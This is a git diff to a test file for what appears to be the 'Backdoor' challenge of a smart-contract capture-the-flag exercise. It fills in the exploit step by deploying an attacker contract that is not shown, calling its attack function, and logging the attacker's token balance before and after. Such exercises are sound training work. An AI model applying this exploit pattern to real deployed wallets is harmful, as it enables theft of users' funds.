@@ -37,6 +37,20 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackFactory = await ethers.getContractFactory('AttackBackdoor', attacker);
+        const attackContract = await AttackFactory.deploy(
+            this.walletFactory.address,
+            this.walletRegistry.address,
+            this.token.address,
+            users,
+            this.masterCopy.address    
+        );
+
+        console.log("Balance Before Attack: ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
+
+        await attackContract.connect(attacker).attack();
+
+        console.log("\nBalance After Attack: ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)))
     });
 
     after(async function () {
